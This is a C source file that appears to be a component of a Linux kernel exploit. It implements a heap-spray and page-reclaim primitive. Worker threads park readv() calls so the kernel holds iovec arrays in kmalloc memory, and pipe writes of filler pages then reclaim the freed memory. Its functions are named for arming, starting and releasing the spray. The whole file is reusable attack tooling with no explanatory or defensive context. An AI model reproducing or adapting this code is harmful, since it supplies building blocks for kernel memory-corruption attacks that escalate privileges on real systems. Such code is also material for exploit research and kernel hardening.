#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/uio.h>
#include <unistd.h>

#define PIPE_IOVEC_RECLAIM_PAGE_SIZE 0x1000U

typedef struct {
    int gate_pipe[2];
    pthread_t thread;
    struct iovec *iovecs;
    size_t iovec_count;
    void *iov_base;
} pipe_iovec_worker_t;

typedef struct {
    pipe_iovec_worker_t *workers;
    size_t worker_count;
    int (*reclaim_pipes)[2];
    size_t reclaim_pipe_count;
    uint8_t *release_bytes;
    uint8_t reclaim_page[PIPE_IOVEC_RECLAIM_PAGE_SIZE];
} pipe_iovec_reclaim_ctx_t;

static void *pipe_iovec_worker_main(void *opaque) {
    pipe_iovec_worker_t *worker = opaque;
    uint8_t gate_byte;

    if (read(worker->gate_pipe[0], &gate_byte, 1) != 1) {
        return NULL;
    }

    /*
     * Once readv() is entered, the kernel has already allocated and copied the
     * iovec array into kmalloc-backed memory. The call then blocks until enough
     * bytes arrive on the pipe to satisfy the full request.
     */
    (void)readv(worker->gate_pipe[0], worker->iovecs, (int)worker->iovec_count);
    return NULL;
}

int init_pipe_iovec_reclaim(pipe_iovec_reclaim_ctx_t *ctx, size_t worker_count,
                            size_t iovec_count, size_t reclaim_pipe_count,
                            void *iov_base) {
    size_t i;

    if (!ctx || !worker_count || !iovec_count || !reclaim_pipe_count) {
        return -EINVAL;
    }

    memset(ctx, 0, sizeof(*ctx));
    ctx->workers = calloc(worker_count, sizeof(*ctx->workers));
    ctx->reclaim_pipes = calloc(reclaim_pipe_count, sizeof(*ctx->reclaim_pipes));
    ctx->release_bytes = calloc(iovec_count, sizeof(*ctx->release_bytes));
    if (!ctx->workers || !ctx->reclaim_pipes || !ctx->release_bytes) {
        return -ENOMEM;
    }

    ctx->worker_count = worker_count;
    ctx->reclaim_pipe_count = reclaim_pipe_count;
    memset(ctx->reclaim_page, 'A', sizeof(ctx->reclaim_page));

    for (i = 0; i < worker_count; i++) {
        pipe_iovec_worker_t *worker = &ctx->workers[i];
        size_t j;

        worker->iovecs = calloc(iovec_count, sizeof(*worker->iovecs));
        if (!worker->iovecs) {
            return -ENOMEM;
        }

        if (pipe(worker->gate_pipe) < 0) {
            return -errno;
        }

        worker->iovec_count = iovec_count;
        worker->iov_base = iov_base;
        for (j = 0; j < iovec_count; j++) {
            worker->iovecs[j].iov_base = (uint8_t *)iov_base + j;
            worker->iovecs[j].iov_len = 1;
        }
    }

    for (i = 0; i < reclaim_pipe_count; i++) {
        if (pipe(ctx->reclaim_pipes[i]) < 0) {
            return -errno;
        }
    }

    return 0;
}

int execute_pipe_iovec_arm_spray(pipe_iovec_reclaim_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->worker_count; i++) {
        if (pthread_create(&ctx->workers[i].thread, NULL, pipe_iovec_worker_main,
                           &ctx->workers[i]) != 0) {
            return -errno;
        }
    }

    return 0;
}

int execute_pipe_iovec_start_spray(pipe_iovec_reclaim_ctx_t *ctx) {
    size_t i;
    uint8_t gate_byte = 'S';

    if (!ctx) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->worker_count; i++) {
        if (write(ctx->workers[i].gate_pipe[1], &gate_byte, 1) != 1) {
            return -EIO;
        }
    }

    return 0;
}

int execute_pipe_iovec_release_spray(pipe_iovec_reclaim_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->worker_count; i++) {
        pipe_iovec_worker_t *worker = &ctx->workers[i];
        if (write(worker->gate_pipe[1], ctx->release_bytes, worker->iovec_count) !=
            (ssize_t)worker->iovec_count) {
            return -EIO;
        }
    }

    for (i = 0; i < ctx->worker_count; i++) {
        pthread_join(ctx->workers[i].thread, NULL);
    }

    return 0;
}

int execute_pipe_iovec_reclaim_pipe_pages(pipe_iovec_reclaim_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return -EINVAL;
    }

    for (i = 0; i < ctx->reclaim_pipe_count; i++) {
        if (write(ctx->reclaim_pipes[i][1], ctx->reclaim_page,
                  sizeof(ctx->reclaim_page)) != (ssize_t)sizeof(ctx->reclaim_page)) {
            return -EIO;
        }
    }

    return 0;
}

void cleanup_pipe_iovec_reclaim(pipe_iovec_reclaim_ctx_t *ctx) {
    size_t i;

    if (!ctx) {
        return;
    }

    for (i = 0; i < ctx->worker_count; i++) {
        if (ctx->workers[i].gate_pipe[0] > 0) {
            close(ctx->workers[i].gate_pipe[0]);
        }
        if (ctx->workers[i].gate_pipe[1] > 0) {
            close(ctx->workers[i].gate_pipe[1]);
        }
        free(ctx->workers[i].iovecs);
    }

    for (i = 0; i < ctx->reclaim_pipe_count; i++) {
        if (ctx->reclaim_pipes[i][0] > 0) {
            close(ctx->reclaim_pipes[i][0]);
        }
        if (ctx->reclaim_pipes[i][1] > 0) {
            close(ctx->reclaim_pipes[i][1]);
        }
    }

    free(ctx->workers);
    free(ctx->reclaim_pipes);
    free(ctx->release_bytes);
    memset(ctx, 0, sizeof(*ctx));
}
